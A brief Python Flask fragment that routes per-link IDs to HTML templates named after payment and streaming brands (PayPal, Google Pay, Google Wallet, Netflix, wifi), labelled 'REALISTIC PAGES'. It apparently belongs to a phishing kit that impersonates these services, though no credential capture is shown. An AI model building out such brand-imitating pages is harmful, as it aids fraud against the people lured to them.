...
# Dedicated routes for each template - REALISTIC PAGES
@app.route('/t/<link_id>')
def template_router(link_id):
    """Route to the correct template based on link config"""
    ...
    # Map templates to their dedicated HTML files
    template_map = {
        ...
        'wifi': 'wifi.html',
        'gpay': 'gpay.html',
        'gwallet': 'gwallet.html',
        'paypal': 'paypal.html'
    }

    template_file = template_map.get(template, 'netflix.html')
